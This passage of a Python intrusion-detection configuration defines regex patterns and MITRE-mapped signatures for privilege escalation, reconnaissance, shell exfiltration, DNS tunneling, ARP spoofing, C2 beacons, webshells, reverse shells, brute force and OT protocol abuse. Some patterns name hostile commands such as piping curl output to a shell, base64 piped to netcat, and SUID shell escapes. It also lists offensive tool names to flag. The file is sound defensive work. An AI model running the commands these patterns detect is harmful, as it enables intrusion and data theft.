        "severity": "HIGH",
        "mitre": ["T1005", "T1552.001"],  # Data from Local System, Credentials in Files
        "desc": "Sensitive file read detected (passwd, shadow, config)",
    },

    # --- Privilege Escalation ---
    "PRIVILEGE_ESCALATION": {
        "patterns": [
            # Achieved root (euid=0)
            rb"euid=0\(root\)",
            rb"uid=0\(root\)",
            # SUID exploitation
            rb"find\s+.*-exec\s+/bin/(sh|bash)",
            rb"find\s+.*-perm\s+-[u4]=[s4]",
            rb"find\s+.*-perm\s+-4000",
            # sudo enumeration
            rb"sudo\s+-l\b",
            rb"\(root\)\s+NOPASSWD:",
            # GTFOBins-style exploitation patterns
            rb"(vim|nano|less|more|man|awk|perl|python|ruby|lua|php)\s+.*LHOST",
            rb"/bin/sh\s+-p",
            rb"/bin/bash\s+-p",
        ],
        "severity": "CRITICAL",
        "mitre": ["T1548.001", "T1068"],  # Setuid/Setgid, Exploitation for Privilege Escalation
        "desc": "Privilege escalation detected",
    },

    # --- Lateral Movement ---
    "LATERAL_MOVEMENT_CREDS": {
        "patterns": [
            # su command (user switching)
            rb"su\s+\w+\s*$",
            # ssh to internal hosts
            rb"ssh\s+\w+@(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)",
            # scp file transfer
            rb"scp\s+.*@.*:",
        ],
        "severity": "HIGH",
        "mitre": ["T1021", "T1078"],  # Remote Services, Valid Accounts
        "desc": "Lateral movement within the network detected",
    },

    # --- Reconnaissance from inside ---
    "INTERNAL_RECON": {
        "patterns": [
            # System enumeration
            rb"uname\s+-a",
            rb"cat\s+/proc/version",
            rb"lsb_release\s+-a",
            # Network enumeration
            rb"ifconfig\b",
            rb"ip\s+addr\b",
            rb"ip\s+route\b",
            rb"netstat\s+-",
            rb"ss\s+-[tlnpa]",
            # User enumeration
            rb"ls\s+-la\s+/home\b",
            rb"ls\s+-la\s+/root\b",
            rb"cat\s+/etc/crontab",
            rb"crontab\s+-l",
        ],
        "severity": "MEDIUM",
        "mitre": ["T1082", "T1016"],  # System Information Discovery, System Network Config
        "desc": "Internal reconnaissance detected",
    },

    # --- Data Exfiltration via Shell ---
    "SHELL_DATA_EXFIL": {
        "patterns": [
            # Base64 encode/decode for exfiltration
            rb"base64\s+(--decode|-d)\s",
            rb"base64\s+.*\|\s*(nc|curl|wget)",
            # Archive creation for exfil
            rb"tar\s+[czf]+.*\.(tar|gz|tgz|zip)",
            rb"zip\s+-r\s+",
            # Download tools used after compromise
            rb"wget\s+http",
            rb"curl\s+-[oO]\s",
            rb"curl\s+.*\|\s*(sh|bash)",
        ],
        "severity": "HIGH",
        "mitre": ["T1041", "T1560"],  # Exfiltration Over C2, Archive Collected Data
        "desc": "Data exfiltration via shell session detected",
    },
}

# C2 Beacon Detection Indicators
C2_BEACON_INDICATORS: Dict[str, Any] = {
    "regular_interval_tolerance": 0.15,   # 15% tolerance for interval detection
    "min_beacon_count": 10,               # Minimum connections to detect beacon
    "beacon_interval_ranges": [           # Common C2 intervals in seconds
        (30, 120),      # Fast beacon (30s - 2min)
        (300, 900),     # Medium beacon (5-15 min)
        (3600, 7200),   # Slow beacon (1-2 hours)
    ],
    "suspicious_ports": [443, 8443, 8080, 4443, 444, 1443],
    "jitter_threshold": 0.3,
                # Added to C2_BEACON_INDICATORS:

    "domain_generation_indicators": {
        "high_entropy_threshold": 4.0,      # Domain entropy
        "random_tld_pattern": True,
        "number_heavy_domains": True,       # Many digits in the domain
        "consonant_heavy": True,            # Many consecutive consonants
    },

    "covert_channel_patterns": [
        "icmp_payload_size_anomaly",        # ICMP payload > 64 bytes
        "dns_query_size_anomaly",           # DNS query > 255 chars
        "http_header_length_anomaly",       # Header too long
        "tls_cert_anomaly",                 # Self-signed cert patterns
    ],            # Max jitter ratio
}

# Data Exfiltration Detection Thresholds
DATA_EXFIL_THRESHOLDS: Dict[str, Any] = {
    "large_transfer_bytes": 10_000_000,       # 10MB in single session
    "rapid_transfer_rate": 1_000_000,         # 1MB/s sustained
    "unusual_hour_start": 22,                 # 10 PM
    "unusual_hour_end": 6,                    # 6 AM
    "dns_exfil_bytes_per_query": 200,         # Bytes per DNS query
    "cumulative_threshold_hour": 100_000_000,

    "protocol_specific_thresholds": {
        "http_post_size": 5_000_000,        # 5MB POST
        "ftp_upload_rate": 10_000_000,      # 10MB/s FTP
        "smtp_attachment_size": 10_000_000, # 10MB email
        "smb_write_rate": 20_000_000,       # 20MB/s SMB write
    },

    "behavioral_thresholds": {
        "new_external_connection": True,     # First-time external dest
        "encryption_before_transfer": True,  # Encrypt then send
        "compression_before_transfer": True, # Compress then send
        "unusual_protocol": True,            # Rare protocol for org
    }, # 100MB per hour per dest
}

# ARP Spoofing Detection Configuration
ARP_DETECTION_CONFIG: Dict[str, Any] = {
    "gratuitous_arp_threshold": 10,        # Gratuitous ARPs in 60 seconds
    "mac_ip_change_threshold": 1,          # >1 distinct MAC for one IP within 5 min = spoofing
    "arp_storm_threshold": 100,            # ARP packets in 10 seconds
    "gateway_arp_sensitivity": "HIGH",     # Extra sensitive for gateway
}

# Extended IT Attack Signatures (additional to existing ones)
IT_ATTACK_SIGNATURES_EXTENDED: Dict[str, Dict[str, Any]] = {


    # =========================================================================
    # RANSOMWARE INDICATORS
    # =========================================================================
    "RANSOMWARE_FILE_ENCRYPTION": {
        "name": "Ransomware File Encryption",
        "description": "Mass file encryption pattern detected",
        "severity": "CRITICAL",
        "mitre": ["T1486"],
    },

    "RANSOMWARE_SHADOW_COPY_DELETE": {
        "name": "Shadow Copy Deletion",
        "description": "vssadmin delete shadows - ransomware prep",
        "severity": "CRITICAL",
        "mitre": ["T1490"],
    },

    "RANSOMWARE_BACKUP_DELETION": {
        "name": "Backup Deletion",
        "description": "Backup file deletion - ransomware indicator",
        "severity": "CRITICAL",
        "mitre": ["T1490"],
    },

    "RANSOMWARE_RANSOM_NOTE": {
        "name": "Ransom Note Creation",
        "description": "Creates README.txt, HOW_TO_DECRYPT files",
        "severity": "CRITICAL",
        "mitre": ["T1486"],
    },

    "DNS_TUNNEL_ENTROPY": {
        "name": "DNS Tunneling - High Entropy",
        "description": "High-entropy DNS subdomain detected, a sign of tunneling",
        "severity": "CRITICAL",
        "mitre": ["T1071.004", "T1048.003"],
    },
    "DNS_TUNNEL_LONG_QUERY": {
        "name": "DNS Tunneling - Long Subdomain",
        "description": "Subdomain is too long, may contain encoded data",
        "severity": "HIGH",
        "mitre": ["T1071.004", "T1048.003"],
    },
    "DNS_TUNNEL_TXT_ABUSE": {
        "name": "DNS TXT Record Abuse",
        "description": "Abnormally many TXT record queries",
        "severity": "HIGH",
        "mitre": ["T1071.004"],
    },
    "DNS_TUNNEL_SUBDOMAIN_DIVERSITY": {
        "name": "DNS Subdomain Diversity",
        "description": "Sign of DNS tunneling or DGA",
        "severity": "CRITICAL",
        "mitre": ["T1071.004", "T1568.002"],
    },

    # DNS Attack signatures (new)
    "DNS_TUNNEL_BASE32": {
        "name": "DNS Tunneling - Base32 Encoding",
        "description": "Base32-encoded subdomain detected (a-z, 2-7)",
        "severity": "HIGH",
        "mitre": ["T1071.004", "T1132.001"],
    },
    "DNS_TUNNEL_BASE64": {
        "name": "DNS Tunneling - Base64 Encoding",
        "description": "URL-safe Base64-encoded subdomain detected",
        "severity": "HIGH",
        "mitre": ["T1071.004", "T1132.001"],
    },
    "DNS_TUNNEL_HEX": {
        "name": "DNS Tunneling - Hex Encoding",
        "description": "Hex-encoded subdomain detected (0-9, a-f)",
        "severity": "HIGH",
        "mitre": ["T1071.004", "T1132.001"],
    },
    "DNS_DGA_SUSPECTED": {
        "name": "Domain Generation Algorithm (DGA)",
        "description": "DGA malware-like pattern detected",
        "severity": "CRITICAL",
        "mitre": ["T1568.002"],
    },
    "DNS_FAST_FLUX": {
        "name": "Fast Flux DNS",
        "description": "Domain changes IP constantly - phishing/malware infrastructure",
        "severity": "HIGH",
        "mitre": ["T1568.001"],
    },
    "DNS_NULL_RESPONSE_ABUSE": {
        "name": "DNS NULL Response Abuse",
        "description": "Uses NULL responses to transfer data",
        "severity": "MEDIUM",
        "mitre": ["T1071.004"],
    },
    "DNS_CNAME_CHAIN": {
        "name": "DNS CNAME Chain Abuse",
        "description": "CNAME chain too long - possible tunneling",
        "severity": "MEDIUM",
        "mitre": ["T1071.004"],
    },
    "DNS_EXFIL_SPLIT": {
        "name": "DNS Exfiltration - Split Queries",
        "description": "Large data split across many DNS queries",
        "severity": "CRITICAL",
        "mitre": ["T1048.003"],
    },

    # =========================================================================
    # ARP Spoofing signatures
    # =========================================================================
    "ARP_SPOOFING_DETECTED": {
        "name": "ARP Spoofing Attack",
        "description": "Abnormal IP-MAC mapping change detected",
        "severity": "CRITICAL",
        "mitre": ["T1557.002", "T1040"],
    },
    "ARP_STORM": {
        "name": "ARP Storm/Flood",
        "description": "Too many ARP packets in a short time",
        "severity": "HIGH",
        "mitre": ["T1557.002"],
    },
    "GRATUITOUS_ARP_ABUSE": {
        "name": "Gratuitous ARP Abuse",
        "description": "Abnormally many gratuitous ARPs - MITM indicator",
        "severity": "HIGH",
        "mitre": ["T1557.002"],
    },

    # ARP Attack signatures (new)
    "ARP_CACHE_POISONING": {
        "name": "ARP Cache Poisoning",
        "description": "Attempt to poison device ARP caches detected",
        "severity": "CRITICAL",
        "mitre": ["T1557.002"],
    },
    "ARP_REPLY_WITHOUT_REQUEST": {
        "name": "ARP Reply Without Request",
        "description": "ARP reply received without a matching request",
        "severity": "HIGH",
        "mitre": ["T1557.002"],
    },
    "ARP_MAC_FLAPPING": {
        "name": "ARP MAC Address Flapping",
        "description": "MAC address changes repeatedly for the same IP",
        "severity": "CRITICAL",
        "mitre": ["T1557.002"],
    },
    "ARP_GATEWAY_SPOOF": {
        "name": "ARP Gateway Spoofing",
        "description": "Attempt to spoof the default gateway MAC",
        "severity": "CRITICAL",
        "mitre": ["T1557.002", "T1557.001"],
    },
    "ARP_BROADCAST_FLOOD": {
        "name": "ARP Broadcast Flood",
        "description": "Too many ARP broadcasts - DoS attempt",
        "severity": "HIGH",
        "mitre": ["T1498"],
    },

    # =========================================================================
    # Data Exfiltration signatures
    # =========================================================================
    "DATA_EXFIL_LARGE_TRANSFER": {
        "name": "Large Data Exfiltration",
        "description": "Large outbound data transfer detected",
        "severity": "CRITICAL",
        "mitre": ["T1041", "T1048"],
    },
    "DATA_EXFIL_UNUSUAL_HOURS": {
        "name": "Unusual Hours Data Transfer",
        "description": "Large data transfer at unusual hours",
        "severity": "HIGH",
        "mitre": ["T1048"],
    },
    "DATA_EXFIL_CUMULATIVE": {
        "name": "Cumulative Data Exfiltration",
        "description": "Total outbound data exceeded the threshold within 1 hour",
        "severity": "CRITICAL",
        "mitre": ["T1041", "T1048"],
    },

    # Data Exfiltration signatures (new)
    "DATA_EXFIL_ENCRYPTED": {
        "name": "Encrypted Data Exfiltration",
        "description": "Encrypted outbound data transfer (HTTPS/SSH/custom)",
        "severity": "CRITICAL",
        "mitre": ["T1048.002", "T1573"],
    },
    "DATA_EXFIL_ICMP": {
        "name": "ICMP Tunneling Exfiltration",
        "description": "Data hidden in ICMP packets",
        "severity": "HIGH",
        "mitre": ["T1048.003"],
    },
    "DATA_EXFIL_FTP": {
        "name": "FTP Data Exfiltration",
        "description": "Large data upload over FTP",
        "severity": "HIGH",
        "mitre": ["T1048.002"],
    },
    "DATA_EXFIL_EMAIL": {
        "name": "Email Data Exfiltration",
        "description": "Emails with large or numerous attachments",
        "severity": "HIGH",
        "mitre": ["T1048.003"],
    },
    "DATA_EXFIL_CLOUD_STORAGE": {
        "name": "Cloud Storage Exfiltration",
        "description": "Data uploaded to Dropbox/Drive/OneDrive",
        "severity": "HIGH",
        "mitre": ["T1567.002"],
    },
    "DATA_EXFIL_PASTEBIN": {
        "name": "Pastebin Exfiltration",
        "description": "Data uploaded to pastebin services",
        "severity": "MEDIUM",
        "mitre": ["T1567.003"],
    },
    "DATA_EXFIL_STEGANOGRAPHY": {
        "name": "Steganography Exfiltration",
        "description": "Data hidden in image/video files",
        "severity": "HIGH",
        "mitre": ["T1027.003"],
    },
    "DATA_EXFIL_CHUNKED": {
        "name": "Chunked Data Exfiltration",
        "description": "Data split into small chunks to evade detection",
        "severity": "HIGH",
        "mitre": ["T1048"],
    },

    # =========================================================================
    # C2 Beacon signatures
    # =========================================================================
    "C2_BEACON_REGULAR": {
        "name": "C2 Beacon - Regular Interval",
        "description": "Connections at regular intervals detected - a sign of C2",
        "severity": "CRITICAL",
        "mitre": ["T1071", "T1573"],
    },
    "C2_BEACON_JITTER": {
        "name": "C2 Beacon with Jitter",
        "description": "Beacon with small variation - advanced C2",
        "severity": "HIGH",
        "mitre": ["T1071", "T1573"],
    },

    # C2 Beacon signatures (new)
    "C2_BEACON_HTTP": {
        "name": "HTTP C2 Beacon",
        "description": "Repeated HTTP/HTTPS requests to the same endpoint",
        "severity": "CRITICAL",
        "mitre": ["T1071.001"],
    },
    "C2_BEACON_DNS": {
        "name": "DNS C2 Beacon",
        "description": "Periodic DNS queries for C2 communication",
        "severity": "CRITICAL",
        "mitre": ["T1071.004"],
    },
    "C2_BEACON_ICMP": {
        "name": "ICMP C2 Beacon",
        "description": "Periodic ICMP packets with unusual payload",
        "severity": "HIGH",
        "mitre": ["T1095"],
    },
    "C2_BEACON_COVERT_CHANNEL": {
        "name": "Covert Channel C2",
        "description": "C2 hidden in legitimate protocols",
        "severity": "CRITICAL",
        "mitre": ["T1001"],
    },
    "C2_BEACON_LONG_CONNECTION": {
        "name": "Long-lived C2 Connection",
        "description": "Abnormally long-lived TCP connection",
        "severity": "HIGH",
        "mitre": ["T1071"],
    },
    "C2_BEACON_TOR": {
        "name": "Tor-based C2",
        "description": "C2 traffic via Tor exit nodes",
        "severity": "CRITICAL",
        "mitre": ["T1090.003"],
    },
    "C2_BEACON_P2P": {
        "name": "P2P C2 Network",
        "description": "Peer-to-peer C2 communication",
        "severity": "CRITICAL",
        "mitre": ["T1102.003"],
    },
    "C2_BEACON_WEB_SERVICE": {
        "name": "Web Service C2",
        "description": "C2 using legitimate web services (Twitter, etc.)",
        "severity": "HIGH",
        "mitre": ["T1102"],
    },

    # =========================================================================
    # HTTP Attack signatures
    # =========================================================================
    "HTTP_SQL_INJECTION": {
        "name": "SQL Injection Attempt",
        "description": "SQL injection pattern detected in HTTP request",
        "severity": "CRITICAL",
        "mitre": ["T1190"],
    },
    "HTTP_XSS_ATTACK": {
        "name": "Cross-Site Scripting (XSS)",
        "description": "Script injection detected in HTTP",
        "severity": "HIGH",
        "mitre": ["T1189"],
    },
    "HTTP_PATH_TRAVERSAL": {
        "name": "Path Traversal Attack",
        "description": "Attempt to access files outside the permitted directory",
        "severity": "HIGH",
        "mitre": ["T1083"],
    },
    "HTTP_WEBSHELL": {
        "name": "Webshell Activity",
        "description": "Webshell indicator detected in HTTP traffic",
        "severity": "CRITICAL",
        "mitre": ["T1505.003"],
    },
    "HTTP_COMMAND_INJECTION": {
        "name": "Command Injection",
        "description": "Command injection detected in HTTP",
        "severity": "CRITICAL",
        "mitre": ["T1059"],
    },
    "SUSPICIOUS_USER_AGENT": {
        "name": "Scanning Tool Detected",
        "description": "Attack/vulnerability scanning tool detected via User-Agent header",
        "severity": "HIGH",
        "mitre": ["T1595", "T1046"],  # Active Scanning
        "patterns": [
            # ===== Network scanners =====
            r"(?i)nmap\s*NSE", r"(?i)nmap scripting", r"(?i)masscan", r"(?i)zmap",
            r"(?i)unicornscan", r"(?i)hping",

            # ===== Vulnerability scanners =====
            r"(?i)nessus", r"(?i)openvas", r"(?i)nexpose",
            r"(?i)qualys", r"(?i)rapid7", r"(?i)acunetix",
            r"(?i)netsparker", r"(?i)appscan", r"(?i)burp\s*suite",
            r"(?i)w3af", r"(?i)skipfish", r"(?i)arachni",
            r"(?i)nikto", r"(?i)vega", r"(?i)wapiti",

            # ===== Web/Directory scanners (CRITICAL FOR YOUR CASE) =====
            r"(?i)sqlmap", r"(?i)havij", r"(?i)pangolin",
            r"(?i)dirbuster", r"(?i)gobuster", r"(?i)dirb",  # ← gobuster here!
            r"(?i)wpscan", r"(?i)joomscan", r"(?i)droopescan",
            r"(?i)nuclei", r"(?i)jaeles", r"(?i)gospider",

            # ===== Fuzzing tools =====
            r"(?i)ffuf", r"(?i)wfuzz", r"(?i)dirsearch",
            r"(?i)feroxbuster", r"(?i)rustbuster",

            # ===== Exploitation frameworks =====
            r"(?i)metasploit", r"(?i)cobalt\s*strike", r"(?i)empire",
            r"(?i)covenant", r"(?i)sliver", r"(?i)koadic",
            r"(?i)beef", r"(?i)xsser", r"(?i)commix",

            # ===== Reconnaissance tools =====
            r"(?i)shodan", r"(?i)censys", r"(?i)fofa",
            r"(?i)theHarvester", r"(?i)recon-ng", r"(?i)amass",
            r"(?i)subfinder", r"(?i)assetfinder",

            # ===== Proxy/Interceptor tools =====
            r"(?i)burp", r"(?i)zap", r"(?i)owasp.*zap", r"(?i)paros",
            r"(?i)webscarab", r"(?i)charles\s*proxy",
            r"(?i)fiddler", r"(?i)mitmproxy",

            # ===== Scripting/Automation indicators =====
            r"(?i)python-requests", r"(?i)python-urllib",
            r"(?i)curl/", r"(?i)wget/", r"(?i)libwww-perl",
            r"(?i)go-http-client", r"(?i)axios/",
            r"(?i)scrapy", r"(?i)selenium", r"(?i)headless",

            # ===== Empty or suspicious User-Agents =====
            r"^-$", r"^\s*$", r"^\.$",  # Empty or dash only
        ],
    },

    # HTTP Attack signatures (new)
    "HTTP_XXE_INJECTION": {
        "name": "XML External Entity (XXE) Injection",
        "description": "XXE injection detected in XML payload",
        "severity": "CRITICAL",
        "mitre": ["T1190"],
    },
    "HTTP_SSRF_ATTACK": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "Attempt to force the server to request internal resources",
        "severity": "CRITICAL",
        "mitre": ["T1190"],
    },
    "HTTP_DESERIALIZATION": {
        "name": "Insecure Deserialization",
        "description": "Malicious serialized objects detected",
        "severity": "CRITICAL",
        "mitre": ["T1190", "T1055"],
    },
    "HTTP_TEMPLATE_INJECTION": {
        "name": "Server-Side Template Injection (SSTI)",
        "description": "Code injected into the template engine",
        "severity": "CRITICAL",
        "mitre": ["T1190"],
    },
    "HTTP_CSRF_ATTACK": {
        "name": "Cross-Site Request Forgery (CSRF)",
        "description": "Forces the user to perform unwanted actions",
        "severity": "HIGH",
        "mitre": ["T1189"],
    },
    "HTTP_CRLF_INJECTION": {
        "name": "CRLF Injection",
        "description": "Injects CR/LF to manipulate HTTP headers",
        "severity": "HIGH",
        "mitre": ["T1190"],
    },
    "HTTP_HOST_HEADER_INJECTION": {
        "name": "Host Header Injection",
        "description": "Manipulates the Host header for password reset poisoning",
        "severity": "HIGH",
        "mitre": ["T1190"],
    },
    "HTTP_OPEN_REDIRECT": {
        "name": "Open Redirect",
        "description": "Redirects the user to a malicious site",
        "severity": "MEDIUM",
        "mitre": ["T1189"],
    },
    "HTTP_CLICKJACKING": {
        "name": "Clickjacking Attack",
        "description": "Tricks the user into clicking hidden elements",
        "severity": "MEDIUM",
        "mitre": ["T1189"],
    },
    "HTTP_DIRECTORY_LISTING": {
        "name": "Directory Listing Exposed",
        "description": "Directory listing accessed - information disclosure",
        "severity": "MEDIUM",
        "mitre": ["T1083"],
    },
    "HTTP_BACKUP_FILE_ACCESS": {
        "name": "Backup File Access",
        "description": "Attempt to access .bak, .old, .backup files",
        "severity": "HIGH",
        "mitre": ["T1083"],
    },
    "HTTP_GIT_EXPOSURE": {
        "name": "Git Repository Exposure",
        "description": "Access to .git directory - source code leak",
        "severity": "CRITICAL",
        "mitre": ["T1213"],
    },
    "HTTP_ENV_FILE_ACCESS": {
        "name": "Environment File Access",
        "description": "Attempt to read .env file containing credentials",
        "severity": "CRITICAL",
        "mitre": ["T1552.001"],
    },

    # =========================================================================
    # Enhanced WebShell Detection
    # =========================================================================
    "HTTP_WEBSHELL_CMD": {
        "name": "WebShell Command Execution",
        "description": "Webshell executing cmd/powershell/bash/sh detected",
        "severity": "CRITICAL",
        "mitre": ["T1505.003", "T1059.001", "T1059.003", "T1059.004"],
    },
    "HTTP_WEBSHELL_JSP": {
        "name": "JSP WebShell Activity",
        "description": "JSP webshell using Runtime.exec() detected",
        "severity": "CRITICAL",
        "mitre": ["T1505.003", "T1059"],
    },
    "HTTP_WEBSHELL_ASPX": {
        "name": "ASPX WebShell Activity",
        "description": "ASPX webshell using Process.Start() detected",
        "severity": "CRITICAL",
        "mitre": ["T1505.003", "T1059"],
    },
    "HTTP_FILE_UPLOAD_DANGER": {
        "name": "Dangerous File Upload",
        "description": "PHP/JSP/ASPX/EXE file upload detected",
        "severity": "CRITICAL",
        "mitre": ["T1505.003", "T1105"],
    },
    "HTTP_FILE_UPLOAD_BINARY": {
        "name": "Binary File Upload",
        "description": "Disguised ELF/PE binary upload detected",
        "severity": "CRITICAL",
        "mitre": ["T1105", "T1027"],
    },
    "HTTP_OBFUSCATION_BASE64": {
        "name": "Base64 Obfuscation Detected",
        "description": "Base64-obfuscated content detected",
        "severity": "HIGH",
        "mitre": ["T1027", "T1140"],
    },
    "HTTP_OBFUSCATION_ENCODING": {
        "name": "Encoding Obfuscation Detected",
        "description": "Hex/gzip/unicode obfuscation detected",
        "severity": "HIGH",
        "mitre": ["T1027", "T1140"],
    },
    "HTTP_OBFUSCATION_EVAL_CHAIN": {
        "name": "Eval Chain Obfuscation",
        "description": "Eval/variable-function chain obfuscation detected",
        "severity": "CRITICAL",
        "mitre": ["T1027", "T1059.004"],
    },
    "HTTP_HEADER_ANOMALY": {
        "name": "HTTP Header Anomaly",
        "description": "Anomalous HTTP header detected",
        "severity": "MEDIUM",
        "mitre": ["T1071.001"],
    },

    # Detailed WebShell signatures
    "HTTP_WEBSHELL_C99": {
        "name": "C99 Shell Detected",
        "description": "Signature of the c99 PHP shell",
        "severity": "CRITICAL",
        "mitre": ["T1505.003"],
    },
    "HTTP_WEBSHELL_R57": {
        "name": "R57 Shell Detected",
        "description": "Signature of the r57 PHP shell",
        "severity": "CRITICAL",
        "mitre": ["T1505.003"],
    },
    "HTTP_WEBSHELL_WSO": {
        "name": "WSO Shell Detected",
        "description": "Signature of WSO (Web Shell by oRb)",
        "severity": "CRITICAL",
        "mitre": ["T1505.003"],
    },
    "HTTP_WEBSHELL_B374K": {
        "name": "b374k Shell Detected",
        "description": "Signature of the b374k Indonesian shell",
        "severity": "CRITICAL",
        "mitre": ["T1505.003"],
    },
    "HTTP_WEBSHELL_CHINA_CHOPPER": {
        "name": "China Chopper Detected",
        "description": "Signature of the China Chopper APT shell",
        "severity": "CRITICAL",
        "mitre": ["T1505.003"],
    },
    "HTTP_WEBSHELL_WEEVELY": {
        "name": "Weevely Shell Detected",
        "description": "Signature of the Weevely stealth shell",
        "severity": "CRITICAL",
        "mitre": ["T1505.003"],
    },
    "HTTP_WEBSHELL_PYTHON": {
        "name": "Python WebShell",
        "description": "Python webshell detected",
        "severity": "CRITICAL",
        "mitre": ["T1505.003", "T1059.006"],
    },
    "HTTP_REVERSE_SHELL_BASH": {
        "name": "Bash Reverse Shell",
        "description": "bash -i reverse shell pattern detected",
        "severity": "CRITICAL",
        "mitre": ["T1059.004"],
    },
    "HTTP_REVERSE_SHELL_NETCAT": {
        "name": "Netcat Reverse Shell",
        "description": "nc -e reverse shell detected",
        "severity": "CRITICAL",
        "mitre": ["T1059"],
    },
    "HTTP_REVERSE_SHELL_POWERSHELL": {
        "name": "PowerShell Reverse Shell",
        "description": "PowerShell reverse shell detected",
        "severity": "CRITICAL",
        "mitre": ["T1059.001"],
    },
    "HTTP_REVERSE_SHELL_PYTHON": {
        "name": "Python Reverse Shell",
        "description": "Python socket reverse shell detected",
        "severity": "CRITICAL",
        "mitre": ["T1059.006"],
    },

    # =========================================================================
    # PORT SCANNING
    # =========================================================================
    "IT_PORT_SCAN_FAST": {
        "name": "Fast Port Scan",
        "description": "Many ports scanned in a short time",
        "severity": "HIGH",
        "mitre": ["T1046"],
    },
    "IT_PORT_SCAN_SYN": {
        "name": "SYN Scan (Half-Open)",
        "description": "Half-open port scan (SYN without ACK)",
        "severity": "MEDIUM",
        "mitre": ["T1046"],
    },
    "IT_PORT_SCAN_CONNECT": {
        "name": "TCP Connect Scan",
        "description": "Full TCP connection port scan",
        "severity": "MEDIUM",
        "mitre": ["T1046"],
    },
    "IT_PORT_SCAN_FIN": {
        "name": "FIN/NULL/XMAS Scan",
        "description": "Stealth scan using unusual TCP flags",
        "severity": "HIGH",
        "mitre": ["T1046"],
    },
    "IT_PORT_SCAN_UDP": {
        "name": "UDP Port Scan",
        "description": "UDP port scanning",
        "severity": "MEDIUM",
        "mitre": ["T1046"],
    },
    "IT_PORT_SCAN_OT_PORTS": {
        "name": "OT Port Scanning",
        "description": "Scanning of OT ports (502, 102, 20000, 44818)",
        "severity": "CRITICAL",
        "mitre": ["T1046"],
    },

    # =========================================================================
    # BRUTE FORCE
    # =========================================================================
    "IT_BRUTE_FORCE": {
        "name": "Brute Force Attack",
        "description": "Many failed login attempts",
        "severity": "HIGH",
        "mitre": ["T1110"],
    },
    "IT_BRUTE_FORCE_SSH": {
        "name": "SSH Brute Force",
        "description": "Brute force SSH login",
        "severity": "HIGH",
        "mitre": ["T1110.001"],
    },
    "IT_BRUTE_FORCE_RDP": {
        "name": "RDP Brute Force",
        "description": "Brute force Remote Desktop",
        "severity": "HIGH",
        "mitre": ["T1110.001"],
    },
    "IT_BRUTE_FORCE_FTP": {
        "name": "FTP Brute Force",
        "description": "Brute force FTP login",
        "severity": "MEDIUM",
        "mitre": ["T1110.001"],
    },
    "IT_BRUTE_FORCE_TELNET": {
        "name": "Telnet Brute Force",
        "description": "Brute force Telnet (common in OT)",
        "severity": "HIGH",
        "mitre": ["T1110.001"],
    },
    "IT_PASSWORD_SPRAY": {
        "name": "Password Spraying",
        "description": "Trying a few passwords across many accounts",
        "severity": "HIGH",
        "mitre": ["T1110.003"],
    },
    "IT_CREDENTIAL_STUFFING": {
        "name": "Credential Stuffing",
        "description": "Using leaked credentials to log in",
        "severity": "HIGH",
        "mitre": ["T1110.004"],
    },

    # =========================================================================
    # DENIAL OF SERVICE
    # =========================================================================
    "IT_DOS_TCP_SYN_FLOOD": {
        "name": "TCP SYN Flood",
        "description": "High volume of SYN packets",
        "severity": "HIGH",
        "mitre": ["T1498.001"],
    },
    "IT_DOS_UDP_FLOOD": {
        "name": "UDP Flood",
        "description": "High volume of UDP packets",
        "severity": "HIGH",
        "mitre": ["T1498.001"],
    },
    "IT_DOS_ICMP_FLOOD": {
        "name": "ICMP Flood (Ping Flood)",
        "description": "High volume of ICMP packets",
        "severity": "MEDIUM",
        "mitre": ["T1498.001"],
    },
    "IT_DOS_HTTP_FLOOD": {
        "name": "HTTP Flood",
        "description": "High volume of HTTP requests",
        "severity": "HIGH",
        "mitre": ["T1498.001"],
    },
    "IT_DOS_SLOWLORIS": {
        "name": "Slowloris Attack",
        "description": "Slow HTTP attack that exhausts connections",
        "severity": "HIGH",
        "mitre": ["T1499.003"],
    },
    "IT_DOS_AMPLIFICATION": {
        "name": "Amplification Attack",
        "description": "DNS/NTP/SSDP amplification attack",
        "severity": "CRITICAL",
        "mitre": ["T1498.002"],
    },

    # =========================================================================
    # OT-SPECIFIC ATTACKS
    # =========================================================================
    "OT_MODBUS_UNAUTHORIZED_WRITE": {
        "name": "Modbus Unauthorized Write",
        "description": "Modbus function 05/06/15/16 from an unauthorized IP",
        "severity": "CRITICAL",
        "mitre": ["T0836", "T0855"],
    },
    "OT_MODBUS_FLOOD": {
        "name": "Modbus Flood Attack",
        "description": "Excessive Modbus requests - PLC DoS",
        "severity": "CRITICAL",
        "mitre": ["T0814"],
    },
    "OT_S7COMM_UNAUTHORIZED": {
        "name": "S7Comm Unauthorized Access",
        "description": "S7Comm Start/Stop/Upload/Download unauthorized",
        "severity": "CRITICAL",
        "mitre": ["T0836", "T0856"],
    },
    "OT_DNP3_UNAUTHORIZED_CONTROL": {
        "name": "DNP3 Unauthorized Control",
        "description": "DNP3 CROB commands unauthorized",
        "severity": "CRITICAL",
        "mitre": ["T0855"],
    },
    "OT_ENIP_UNAUTHORIZED": {
        "name": "EtherNet/IP Unauthorized CIP",
        "description": "CIP commands from an unknown source",
        "severity": "CRITICAL",
        "mitre": ["T0855"],
    },
    "OT_IEC104_SPONTANEOUS": {
        "name": "IEC-104 Spontaneous Commands",
        "description": "IEC-104 commands from a non-master station",
        "severity": "CRITICAL",
        "mitre": ["T0855"],
    },
    "OT_PROFINET_DCP_SPOOF": {
        "name": "Profinet DCP Spoofing",
        "description": "Malicious DCP packets",
        "severity": "HIGH",
        "mitre": ["T0813"],
    },

    # =========================================================================
    # NETWORK ATTACKS
    # =========================================================================
    "NET_DHCP_STARVATION": {
        "name": "DHCP Starvation",
        "description": "Exhaust DHCP pool",
        "severity": "HIGH",
        "mitre": ["T1498"],
    },
    "NET_VLAN_HOPPING": {
        "name": "VLAN Hopping",
        "description": "Bypass VLAN segmentation",
        "severity": "CRITICAL",
        "mitre": ["T1599.001"],
    },
    "NET_STP_MANIPULATION": {
        "name": "STP Manipulation",
        "description": "BPDU spoofing, become root bridge",
        "severity": "CRITICAL",
        "mitre": ["T1599"],
    },
    "NET_MAC_FLOODING": {
        "name": "MAC Address Flooding",
        "description": "Overflow CAM table",
        "severity": "HIGH",
        "mitre": ["T1498"],
    },
    "NET_CDP_LLDP_RECON": {
        "name": "CDP/LLDP Reconnaissance",
        "description": "Network topology reconnaissance",
        "severity": "MEDIUM",
        "mitre": ["T1590"],
    },

    # =========================================================================
    # MALWARE BEHAVIORS
    # =========================================================================
    "MAL_LATERAL_MOVEMENT_PSEXEC": {
        "name": "Lateral Movement - PsExec",
